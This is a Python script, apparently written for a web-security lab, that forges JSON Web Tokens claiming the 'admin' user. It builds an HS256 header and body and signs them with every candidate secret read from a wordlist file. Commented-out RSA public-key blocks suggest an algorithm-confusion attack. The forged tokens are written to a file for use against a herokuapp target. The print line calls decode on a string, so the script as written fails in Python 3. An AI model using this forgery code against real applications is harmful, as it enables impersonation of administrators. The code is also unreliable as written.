import binascii
import hashlib
import hmac
import base64

# secret_key = b'''-----BEGIN PUBLIC KEY-----
# MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtpE9DLGusn7hb5gvHuP5
# Y+3RjxWfsf+H42JuCSyhfzTrZz+DQreBJIFqz0Hhe3d0qmrA+qyrrZCcRubouveE
# YCXthUHlIb/LwZKfeh+fhYLgvFdsR7VkJUhiEjvgpwhwfljHW7LaDfKV1q+nYBcB
# QtME9pnN0jXRzT7/vdubjs49UFz5DFS38DSl5MxnqyFKUR6yCZJRhPsG8fr5A7ad
# fjJGKm4O8g9K5XnxTpgu/PYLRX+UNxhSFVq0lCDBHR9QQudYbiWXvQGnAdbLDsK2
# lEemTk8yNa3rmy1rAxVMZ8GqAd4x2K6juklb6q4YJkNHv9V4HYJXjRXiwHtjr4NW
# EwIDAQAB
# -----END PUBLIC KEY-----
# '''
# c = b'''	-----BEGIN PUBLIC KEY-----
# 	MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtpE9DLGusn7hb5gvHuP5
# 	Y+3RjxWfsf+H42JuCSyhfzTrZz+DQreBJIFqz0Hhe3d0qmrA+qyrrZCcRubouveE
# 	YCXthUHlIb/LwZKfeh+fhYLgvFdsR7VkJUhiEjvgpwhwfljHW7LaDfKV1q+nYBcB
# 	QtME9pnN0jXRzT7/vdubjs49UFz5DFS38DSl5MxnqyFKUR6yCZJRhPsG8fr5A7ad
# 	fjJGKm4O8g9K5XnxTpgu/PYLRX+UNxhSFVq0lCDBHR9QQudYbiWXvQGnAdbLDsK2
# 	lEemTk8yNa3rmy1rAxVMZ8GqAd4x2K6juklb6q4YJkNHv9V4HYJXjRXiwHtjr4NW
# 	EwIDAQAB
# 	-----END PUBLIC KEY-----
# '''
header ='{"alg":"HS256"}'

body = '{"name":  "admin"}'

a = base64.urlsafe_b64encode(header.encode('utf-8'))
b = base64.urlsafe_b64encode(body.encode('utf-8'))
with open('/home/tinnguyen1/script-burp-lab/secret.txt','r') as f:
    secret_key = f.readline().strip()
    fp = open('/home/tinnguyen1/script-burp-lab/jwt-token-herokuapp.txt','w')
    while secret_key:
        # print(secret_key.encode('utf-8'))
        sig = hmac.new(secret_key.encode('utf-8'),msg=a+'.'.encode('utf-8')+b,digestmod=hashlib.sha256).hexdigest()
        sig = base64.urlsafe_b64encode(binascii.unhexlify(sig)).decode('utf-8').replace('=','')
        fp.write(a.decode('utf-8') +'.'+b.decode('utf-8') +'.'+ sig +'\n')
        print(secret_key.decode('utf-8') + "-" + a.decode('utf-8') +'.'+b.decode('utf-8') +'.'+ sig)
        secret_key = f.readline().strip()


# a = a.decode('utf-8')
# b = b.decode('utf-8')

# print(a+'.'+b+'.'+sig)
